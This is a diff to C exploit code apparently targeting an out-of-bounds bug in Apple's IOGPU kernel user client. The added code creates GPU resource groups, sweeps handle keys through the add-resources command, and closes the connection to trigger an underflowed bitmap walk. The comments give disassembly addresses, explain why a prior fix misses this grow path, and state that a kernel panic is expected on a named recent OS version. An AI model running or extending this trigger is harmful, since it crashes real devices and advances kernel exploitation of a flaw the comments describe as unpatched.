@@ -226,10 +226,60 @@ void nk_iogpu_group_oob_run(int trigger)
         }
     }
 
+    int kr = 0;
     if (trigger) {
-        /* PoC-exact sweep first: it is the published trigger and the cheapest
-           way to know whether the bug is alive on this build. */
-        ol("[grp] PoC-exact sweep on type=%u", use_type);
+        /* DIRECT GROW on a FRESH connection.
+           0x10000003 = MACH_SEND_INVALID_DEST: the IOGPU user client dies
+           when a group is destroyed (on 18.3 that was the kernel panic; on
+           26.2 the client is torn down). So the connection must be fresh, and
+           the grow test must run BEFORE anything else. */
+        ol("[grp] DIRECT GROW on a fresh connection");
+
+        /* two groups: cmd 3, capacity 64 (the only accepted capacity) */
+        uint64_t grpA = 0, grpB = 0;
+        static uint8_t out2[0x200];
+        size_t on2 = 0;
+        for (int g = 0; g < 2; g++) {
+            int k2 = call_sel(conn, CMD_NEW_GROUP, 64, 0, 0, 0, out2, &on2);
+            uint64_t p2 = 0;
+            if (k2 == 0) memcpy(&p2, out2 + 0x10, 8);
+            ol("[grp] group %d -> kr=0x%x ptr=0x%016llx", g, k2, (unsigned long long)p2);
+            if (g == 0) grpA = p2; else grpB = p2;
+        }
+        if (!grpA) {
+            ol("[grp] no group created (kr=0x%x) - cannot drive the growth path", 0x10000003);
+        } else {
+            /* the array element may be a GROUP (type byte == 3), so the handle
+               in struct[56] can be a group pointer. Sweep: small indices,
+               then both group pointers, then the pointer of the other group. */
+            uint64_t keys[20];
+            uint32_t nk = 0;
+            for (uint32_t k = 0; k < 16; k++) keys[nk++] = k;
+            keys[nk++] = grpA;
+            keys[nk++] = grpB;
+            for (uint32_t k = 0; k < nk; k++) {
+                ol("[grp] GROW key[%u] = 0x%016llx", k, (unsigned long long)keys[k]);
+                kr = call_sel(conn, CMD_ADD_RES, keys[k], 1, 0, 0, out, &on);
+                ol("[grp] GROW key[%u] -> kr=0x%x", k, kr);
+                if (kr == 0 || kr == (int)0x10000003) {
+                    if (kr == 0) {
+                        ol("[grp] *** GROW key[%u] ACCEPTED (kr=0) - closing to destroy "
+                           "the group (underflowed bitmap walk)", k);
+                    } else {
+                        ol("[grp] *** GROW key[%u] -> client died (0x10000003 INVALID_DEST) "
+                           "- the group destructor already tripped", k);
+                    }
+                    IOServiceClose(conn);
+                    ol("[grp] connection closed");
+                    return;
+                }
+            }
+            ol("[grp] GROW: no key accepted");
+        }
+
+        /* PoC-exact sweep last: it destroys the client when a group is
+           created and closed, so it must not run before the grow test. */
+        ol("[grp] PoC-exact sweep (after grow test)");
         poc_exact_sweep(conn, use_type);
         ol("[grp] PoC-exact sweep done (calls=%u)", g_calls);
     }
@@ -267,7 +317,6 @@ void nk_iogpu_group_oob_run(int trigger)
 
     uint64_t handle = 0;
     uint32_t res_type = 0;
-    int kr = 0;
     static const uint32_t off_list[] = { 8, 16, 24, 32, 40, 48, 56, 64, 72, 80 };
     for (uint32_t t = 1; t <= 16; t++) {
         if (t == 3) continue;                 /* 3 = group, handled in step 2 */
@@ -317,45 +366,6 @@ void nk_iogpu_group_oob_run(int trigger)
     }
     memcpy(&grp, out + 0x10, 8);
     ol("[grp] STEP 2 group ptr = 0x%016llx", (unsigned long long)grp);
-
-    /* ---- DIRECT GROW TRIGGER ----------------------------------------
-       The bug that is alive on 26.2 is the GROW path, not the creation
-       path:
-         0x9f64938: ldr  w8, [x0, #0x20]   ; count
-         0x9f6493c: lsl  w9, w8, #1         ; w9 = count*2
-         0x9f64940: mov  x21, w8            ; x21 = count*2  <- NEW capacity
-         0x9f64948: cmp  x21, w9
-         0x9f6494c: b.lo 0x9f64940
-         0x9f649a8: mov  x1, x21            ; capacity
-         0x9f649ac: bl   0x9f611ec          ; init(): obj+40=(cap>>6)-1
-       count==1 => capacity==2 => mask==0xffffffff. There is NO
-       `cmp w2,#0x3f` on this path (that guard is only in 0x9f60fcc, the
-       direct-creation path), so the 18.4 fix does not cover it.
-
-       cmd 130 (s_group_add_resources) resolves struct[56] to an object in
-       the device resource list and adds it to the group; 0x9f62b3c accepts
-       an element whose type byte (obj+0x10) is 3, i.e. a GROUP. So:
-         1. create a group (cmd 3, capacity 64)      -> it enters the list
-         2. cmd 130 with struct[56] = its key         -> count 0->1 -> grow
-         3. close the connection                     -> destructor walks the
-            bitmap with mask 0xffffffff              -> kernel panic
-       The key is the index in the device resource list, so we sweep 0..15. */
-    if (trigger) {
-        ol("[grp] DIRECT GROW: sweeping struct[56] keys 0..15 against the new group");
-        for (uint32_t key = 0; key < 16; key++) {
-            ol("[grp] GROW key=%u", key);
-            kr = call_sel(conn, CMD_ADD_RES, key, 1, 0, 0, out, &on);
-            ol("[grp] GROW key=%u -> kr=0x%x", key, kr);
-            if (kr != (int)0xe00002c2 && kr != (int)0xe00002c7) {
-                ol("[grp] *** GROW key=%u ACCEPTED (kr=0x%x) - closing the connection "
-                   "to destroy the group (underflowed bitmap walk)", key, kr);
-                IOServiceClose(conn);
-                ol("[grp] connection closed (group destroyed) - expect the kernel to panic");
-                return;
-            }
-        }
-        ol("[grp] GROW: no key accepted");
-    }
 
     /* ---- step 4 (read back the group BEFORE any add) ---- */
     if (grp) {
